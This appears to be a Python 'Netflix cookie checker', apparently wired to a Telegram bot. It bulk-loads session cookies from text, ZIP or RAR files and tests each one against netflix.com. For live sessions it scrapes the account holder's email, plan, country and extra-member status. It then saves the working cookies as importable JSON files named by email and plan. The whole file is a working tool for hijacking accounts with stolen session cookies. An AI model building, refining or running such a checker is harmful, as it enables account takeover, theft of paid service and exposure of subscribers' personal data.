import os
import json
import requests
import certifi
import re
import shutil
import uuid
import zipfile
import threading
from concurrent.futures import ProcessPoolExecutor, as_completed
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup
import hashlib
import rarfile

# --- Basic Setup ---
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
stop_flag = False
SECURE_HTTPONLY_NAMES = {"NetflixId", "SecureNetflixId"}

# --- Thread-safe counters and a set for tracking saved emails ---
check_lock = threading.Lock()
valid_count = 0
invalid_count = 0
checked_count = 0
saved_emails = set()

# Global variable to store temp directory path
temp_results_dir = None

def log(text):
    """Simple logging function for console output"""
    print(text)

# --- NEW: Function to scan the output folder for existing emails ---
def get_emails_from_folder(folder_path):
    """Scans the valid cookies folder and extracts emails from filenames."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        return set()

    existing_emails = set()
    # Regex to safely extract the email from the filename format: [Country][Email][Plan]...
    email_pattern = re.compile(r'\[([^\]]+)\]\[([^\]]+@[^\]]+)\]')
    
    for filename in os.listdir(folder_path):
        match = email_pattern.search(filename)
        if match:
            email = match.group(2)
            existing_emails.add(email)
            
    return existing_emails

# --- New, Self-Contained Plan Extraction Function ---
def extract_netflix_plan(html_content: str) -> str:
    """
    Extracts the Netflix plan name from the HTML content of the account page.
    It tries multiple methods in a specific order to handle different layouts.
    """
    plan = "Unknown"  # Default value

    # --- Attempt 1: Primary Method (Fast but specific string splitting) ---
    try:
        plan = html_content.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
        if plan: return plan.strip()
    except IndexError:
        pass

    # --- Attempt 2: Fallback using BeautifulSoup (More robust parsing) ---
    try:
        soup = BeautifulSoup(html_content, "html.parser")
        h3_tag = soup.find('h3', class_='default-ltr-cache-10ajupv e19xx6v32')
        if h3_tag and h3_tag.text:
            return h3_tag.text.strip()
        
        h3_tag_robust = soup.find('h3', class_=lambda c: c and 'card+title' in c)
        if h3_tag_robust and h3_tag_robust.text:
            return h3_tag_robust.get_text(strip=True)

    except Exception:
        pass

    # --- Attempt 3: Final String Splitting Fallback ---
    try:
        plan = html_content.split('<div class="account-section-item" data-uia="plan-label">')[1].split("</p><p>")[0].split('<p class="beneficiary-header">')[1].replace(":", "")
        if plan: return plan.strip()
    except IndexError:
        pass

    return plan if plan != "Unknown" else "NULL"

# --- Main Checker Class with Revised Logic ---
class NetflixCookieChecker:
    """
    Handles the validation of Netflix cookies and extraction of account information.
    """
    def get_country_name(self, country_code):
        country_map = {
            'US': 'USA', 'CA': 'Canada', 'GB': 'UK', 'DE': 'Germany', 'FR': 'France',
            'IT': 'Italy', 'ES': 'Spain', 'AU': 'Australia', 'JP': 'Japan',
            'BR': 'Brazil', 'MX': 'Mexico', 'IN': 'India', 'NL': 'Netherlands'
        }
        return country_map.get(country_code.upper(), country_code)

    def get_email_from_security_page(self, headers, cookies):
        try:
            response = requests.get("https://www.netflix.com/account/security", headers=headers, cookies=cookies, timeout=10)
            pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
            matches = re.findall(pattern, response.text)
            return matches[0] if matches else None
        except Exception:
            return None
            
    def validate_and_get_info(self, cookie_dict):
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }

        try:
            login_check_response = requests.get('https://www.netflix.com/browse', headers=headers, cookies=cookie_dict, timeout=10)
            if 'Sign In' in login_check_response.text or 'login' in login_check_response.url.lower():
                return False, {"error": "Invalid Cookie (Login Failed)"}
        except requests.RequestException as e:
            return False, {"error": f"Connection Error: {e}"}

        info = {'email': 'N/A', 'plan': 'N/A', 'country': 'N/A', 'extra_member': 'false'}
        try:
            account_page_response = requests.get("https://www.netflix.com/YourAccount", headers=headers, cookies=cookie_dict, timeout=15)
            html = account_page_response.text

            # --- Email Extraction ---
            email = 'N/A'
            try:
                json_data_match = re.search(r'<script id="react-context" type="application/json">(.+?)</script>', html)
                if json_data_match:
                    react_context = json.loads(json_data_match.group(1))
                    email = react_context.get('models', {}).get('memberContext', {}).get('data', {}).get('email', 'N/A')
                if email == 'N/A': raise AttributeError
            except (AttributeError, json.JSONDecodeError, KeyError):
                email = self.get_email_from_security_page(headers, cookie_dict) or 'N/A'
            info['email'] = email
            
            # --- Plan Extraction using the new dedicated function ---
            info['plan'] = extract_netflix_plan(html)

            # --- Extract Country ---
            try:
                country_code = re.search(r'"currentCountry":"([^"]+)"', html).group(1)
                info['country'] = self.get_country_name(country_code)
            except AttributeError:
                info['country'] = 'N/A'

            # --- Check for Extra Member slot ---
            info['extra_member'] = "True" if "addextramember" in html else "false"

            return True, info

        except requests.RequestException as e:
            return True, info
# --- NEW: Worker function for ProcessPoolExecutor ---
def worker_process_single_cookie(args):
    """Worker function to process one cookie dictionary in a separate process."""
    cookie_dict, source_filename, temp_results_dir = args
    
    # Create checker instance in this process
    checker = NetflixCookieChecker()
    
    try:
        is_valid, info = checker.validate_and_get_info(cookie_dict)
        
        if is_valid:
            email = info.get('email', 'N/A')
            
            # Create filename for valid cookie
            filename = (
                f"[{info.get('country', 'N/A')}]"
                f"[{info.get('email', 'N/A')}]"
                f"[{info.get('plan', 'NULL')}]"
                f"[{info.get('extra_member', 'false')}].txt"
            )
            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
            
            # Save valid cookie
            valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
            os.makedirs(valid_dir, exist_ok=True)
            output_path = os.path.join(valid_dir, filename)
            
            payload = []
            for name, value in cookie_dict.items():
                secure = name in SECURE_HTTPONLY_NAMES
                http_only = name in SECURE_HTTPONLY_NAMES
                payload.append({
                    "name": name, "value": value, "domain": ".netflix.com", 
                    "path": "/", "secure": secure, "httpOnly": http_only
                })

            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
            
            return ("valid", email, info, os.path.basename(output_path))
        else:
            error_msg = info.get('error', 'Unknown error')
            
            # Save invalid cookie
            filename = os.path.basename(source_filename)
            filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
            
            invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
            os.makedirs(invalid_dir, exist_ok=True)
            output_path = os.path.join(invalid_dir, filename)

            payload = []
            for name, value in cookie_dict.items():
                secure = name in SECURE_HTTPONLY_NAMES
                http_only = name in SECURE_HTTPONLY_NAMES
                payload.append({
                    "name": name, "value": value, "domain": ".netflix.com", 
                    "path": "/", "secure": secure, "httpOnly": http_only
                })
            
            # Add the error message to the saved JSON for context
            invalid_data = {
                "error": error_msg,
                "source_file": os.path.basename(source_filename),
                "cookie_data": payload
            }

            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(invalid_data, f, ensure_ascii=False, indent=4)
            
            return ("invalid", error_msg, source_filename)
            
    except Exception as e:
        return ("error", str(e), source_filename)

# --- Cookie Parsing Functions ---
def _parse_cookie_header_format(cookie_str: str):
    if ' = ' in cookie_str and ';' not in cookie_str:
        cookie_str = cookie_str.replace(' = ', '=', 1)
    cookie = SimpleCookie()
    cookie.load(cookie_str)
    return {key: morsel.value for key, morsel in cookie.items()}

def parse_cookie_line(cookie_str: str):
    cookie_str = cookie_str.strip()
    if cookie_str.startswith('{'):
        try:
            data = json.loads(cookie_str)
            if isinstance(data, dict) and 'name' in data and 'value' in data:
                return {str(data['name']): str(data['value'])}
        except: pass
    return _parse_cookie_header_format(cookie_str)

def parse_netscape_format(file_content: str):
    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        try:
            parts = line.split('\t')
            if len(parts) == 7: cookies[parts[5]] = parts[6]
        except: continue
    return cookies if cookies else None

def parse_input_to_cookie_list(file_content: str):
    content = file_content.strip()
    if not content: return []
    lines = content.splitlines()
    first_line = lines[0].strip()

    if first_line.startswith('NetflixId'):
        log("Detected 'NetflixId' start: Processing line-by-line.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]
    elif first_line.startswith('['):
        log("Detected '[' start: Processing as a single JSON array.")
        try:
            data = json.loads(content)
            cookie_dict = {str(i['name']): str(i['value']) for i in data if 'name' in i and 'value' in i}
            return [cookie_dict] if cookie_dict else []
        except:
            log("Error: Failed to parse JSON array.")
            return []
    elif first_line.startswith('.') or first_line.startswith('# Netscape'):
        log("Detected Netscape format.")
        cookie_dict = parse_netscape_format(content)
        return [cookie_dict] if cookie_dict else []
    else:
        log("No specific format detected, attempting simple Key=Value parsing.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]
# --- REVISED: run_check_on_file_list using ProcessPoolExecutor ---
def run_check_on_file_list(file_paths, live=False):
    """
    Reads a list of .txt files, parses all cookies, and then runs the checker using ProcessPoolExecutor.
    This is the main orchestrator for the checking process.
    """
    global temp_results_dir, stop_flag
    
    # Initialize counters
    stop_flag = False
    valid_count, invalid_count, checked_count = 0, 0, 0
    saved_emails = set()
    
    # Create temporary directory for results
    temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
    os.makedirs(temp_results_dir, exist_ok=True)
    
    cookies_with_sources = [] 

    for file_path in file_paths:
        if stop_flag:
            log("🛑 Process stopped by user during file reading.")
            break
        try:
            log(f"📖 Reading file: {os.path.basename(file_path)}")
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            cookies_from_file = parse_input_to_cookie_list(content)
            if cookies_from_file:
                log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
                for cookie_dict in cookies_from_file:
                    cookies_with_sources.append((cookie_dict, file_path, temp_results_dir))
            else:
                log(f"  -> No valid cookie formats found in this file.")

        except Exception as e:
            log(f"  -> ❌ Error reading or parsing file {os.path.basename(file_path)}: {e}")
            continue
    
    total_to_check = len(cookies_with_sources)
    if total_to_check == 0:
        log('No valid cookies found in the provided file(s).')
        if live:
            yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
        return temp_results_dir

    log(f'Found a total of {total_to_check} cookies to check across all files.')

    try:
        # Use ProcessPoolExecutor with max_workers processes
        with ProcessPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(worker_process_single_cookie, args): args 
                      for args in cookies_with_sources}
            
            for future in as_completed(futures):
                if stop_flag:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                try:
                    result = future.result()
                    checked_count += 1
                    
                    if result[0] == "valid":
                        valid_count += 1
                        email = result[1]
                        if email != 'N/A':
                            if email in saved_emails:
                                log(f"🔄 UPDATED: Refreshed cookie for {email}")
                            else:
                                saved_emails.add(email)
                                log(f"💾 NEW: {result[3]}")
                        else:
                            log(f"💾 NEW: {result[3]}")
                    elif result[0] == "invalid":
                        invalid_count += 1
                        log(f"❌ INVALID: {result[1]} (from {os.path.basename(result[2])})")
                    else:  # error
                        invalid_count += 1
                        log(f"❌ ERROR: {result[1]} (from {os.path.basename(result[2])})")
                    
                    # Update progress
                    progress = checked_count / total_to_check
                    log(f'Progress: {checked_count}/{total_to_check} | Valid: {valid_count} | Invalid: {invalid_count}')
                    
                    if live:
                        yield (checked_count, total_to_check, valid_count, invalid_count)
                        
                except Exception as e:
                    log(f"Error processing result: {e}")
                    invalid_count += 1
                    checked_count += 1

        if stop_flag:
            log('⏹️ Checking stopped by user.')
        else:
            log('🎉 Done checking all cookies.')
            log(f'Final Results: Valid: {valid_count} | Invalid: {invalid_count}')

    except Exception as e:
        log(f'Error during check: {e}')
    
    if live:
        yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
    return temp_results_dir

# --- REVISED: process_file_and_check supports live yields ---
def process_file_and_check(input_file, live=False):
    """Handles file input, extracts archives if necessary, and starts the check."""
    log('⚙️ Starting process...')
    
    if not input_file or not os.path.exists(input_file):
        log('Error: Please select a valid file first.')
        if live:
            yield (0, 0, 0, 0, None)
        return None

    file_ext = os.path.splitext(input_file)[-1].lower()
    txt_file_paths = []
    extract_dir = f"temp_extract_{uuid.uuid4().hex}"

    try:
        if file_ext == '.txt':
            log(f"Selected single text file: {os.path.basename(input_file)}")
            txt_file_paths.append(input_file)

        elif file_ext == '.zip':
            log(f"📦 ZIP archive detected. Extracting...")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(input_file, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            log("✅ ZIP extracted. Searching for .txt files...")
            txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]

        elif file_ext == '.rar':
            log(f"📦 RAR archive detected. Extracting...")
            try:
                rarfile.UNRAR_TOOL = "UnRAR.exe"
                os.makedirs(extract_dir, exist_ok=True)
                with rarfile.RarFile(input_file, 'r') as rar_ref:
                    rar_ref.extractall(extract_dir)
                log("✅ RAR extracted. Searching for .txt files...")
                txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]
            except Exception as e:
                log(f"❌ Failed to extract RAR: {e}")
                if live:
                    yield (0, 0, 0, 0, None)
                return None
        
        else:
            log("Unsupported File: Please select a .txt, .zip, or .rar file.")
            if live:
                yield (0, 0, 0, 0, None)
            return None
        if not txt_file_paths:
            log("❌ No .txt files found to process.")
            if live:
                yield (0, 0, 0, 0, None)
            return None
        
        log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
        
        # Call the revised run_check_on_file_list function
        if live:
            # Generator mode - yield results as they come
            for result in run_check_on_file_list(txt_file_paths, live=True):
                yield result
        else:
            # Non-generator mode - return final result
            return run_check_on_file_list(txt_file_paths, live=False)

    finally:
        # Clean up extraction directory
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

# Main function to be called by telegram bot
def main(file_paths):
    """Main function to be called by the telegram bot"""
    if not file_paths:
        return None
    
    # Process the first file (assuming single file upload)
    results_dir = process_file_and_check(file_paths[0])
    return results_dir

# --- For multiprocessing support on Windows ---
if __name__ == "__main__":
    # This is required for ProcessPoolExecutor on Windows
    import multiprocessing
    multiprocessing.freeze_support()
    
    # Test with local file
    test_files = ["test_cookies.txt"]
    results = main(test_files)
    if results:
        print(f"Results saved to: {results}")
